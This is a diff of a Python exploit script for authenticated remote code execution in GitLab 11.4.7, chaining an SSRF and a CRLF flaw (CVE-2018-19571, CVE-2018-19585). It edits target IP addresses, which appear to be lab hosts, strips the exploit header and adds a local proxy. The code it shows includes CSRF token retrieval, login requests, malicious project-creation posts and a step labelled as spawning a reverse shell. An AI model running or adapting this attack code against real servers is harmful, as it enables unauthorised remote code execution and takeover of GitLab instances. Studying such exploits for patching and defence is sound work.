@@ -1,11 +1,3 @@
-# Exploit Title: GitLab 11.4.7 Authenticated Remote Code Execution (No Interaction Required)
-# Date: 15th December 2020
-# Exploit Author: Mohin Paramasivam (Shad0wQu35t)
-# Software Link: https://about.gitlab.com/
-#POC: https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/
-# Tested on: GitLab 11.4.7 CE
-# CVE : CVE-2018-19571 (SSRF),CVE-2018-19585 (CRLF)
-
 import requests
 import re
 import warnings
@@ -38,7 +30,7 @@ lport = args.p
 #Retrieve CSRF Token
 
 warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
-gitlab_url = "http://10.129.49.56:5080"
+gitlab_url = "http://10.129.49.67:5080"
 request = requests.Session()
 print("[+] Retrieving CSRF token to submit the login form")
 time.sleep(1)
@@ -182,7 +174,7 @@ elif (http_server=="Y") or (http_server=="y"):
 		    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
 		    'Accept-Language': 'en-US,en;q=0.5',
 		    'Accept-Encoding': 'gzip, deflate',
-		    'Referer': '%s/projects' %gitlab_url,
+		    'Referer': 'http://10.129.49.31:5080/projects',
 		    'Content-Type': 'application/x-www-form-urlencoded',
 		    'Content-Length': '398',
 		    'Connection': 'close',
@@ -193,7 +185,7 @@ elif (http_server=="Y") or (http_server=="y"):
 
 		#response = request.post('http://10.129.49.31:5080/projects',data=payload,proxies=proxies,cookies=cookies,headers=headers,verify=False)
 
-		response1 = request.post(gitlab_url+'/projects',data=payload,cookies=cookies,headers=headers,verify=False)
+		response1 = request.post(gitlab_url+'/projects',data=payload,cookies=cookies,proxies=proxies,headers=headers,verify=False)
 		print("[+] Success!")
 		time.sleep(1)
 		print("[+] Run Exploit with Option 2")
@@ -245,7 +237,7 @@ elif (http_server=="Y") or (http_server=="y"):
 		    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
 		    'Accept-Language': 'en-US,en;q=0.5',
 		    'Accept-Encoding': 'gzip, deflate',
-		    'Referer': '%s/projects'%gitlab_url,
+		    'Referer': 'http://10.129.49.31:5080/projects',
 		    'Content-Type': 'application/x-www-form-urlencoded',
 		    'Content-Length': '398',
 		    'Connection': 'close',
@@ -256,49 +248,9 @@ elif (http_server=="Y") or (http_server=="y"):
 
 		#response = request.post('http://10.129.49.31:5080/projects',data=payload,proxies=proxies,cookies=cookies,headers=headers,verify=False)
 
-		response1 = request.post(gitlab_url+'/projects',data=payload,cookies=cookies,headers=headers,verify=False)
-		print("[+] Success!")
-		time.sleep(1)
-		print("[+] Spawning Reverse Shell")
-
-
-
-
-
-		proxies = {
-			"http" : "http://127.0.0.1:8080",
-		     	"https" : "https://127.0.0.1:8080",
-			    }
-			    
-		cookies = {
-		    'sidebar_collapsed': 'false',
-		    'event_filter': 'all',
-		    'hide_auto_devops_implicitly_enabled_banner_1': 'false',
-		    '_gitlab_session':request.cookies['_gitlab_session'],
-		}
-
-		headers = {
-		    'Host': '10.129.49.31:5080',
-		    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
-		    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-		    'Accept-Language': 'en-US,en;q=0.5',
-		    'Accept-Encoding': 'gzip, deflate',
-		    'Referer': 'http://10.129.49.31:5080/projects',
-		    'Content-Type': 'application/x-www-form-urlencoded',
-		    'Content-Length': '398',
-		    'Connection': 'close',
-		    'Upgrade-Insecure-Requests': '1',
-		}
-
-
-
-		#response = request.post('http://10.129.49.31:5080/projects',data=payload,cookies=cookies,headers=headers,verify=False)
-
 		response1 = request.post(gitlab_url+'/projects',data=payload,cookies=cookies,proxies=proxies,headers=headers,verify=False)
 		print("[+] Success!")
 		time.sleep(1)
 		print("[+] Spawning Reverse Shell")
-
-
 
 
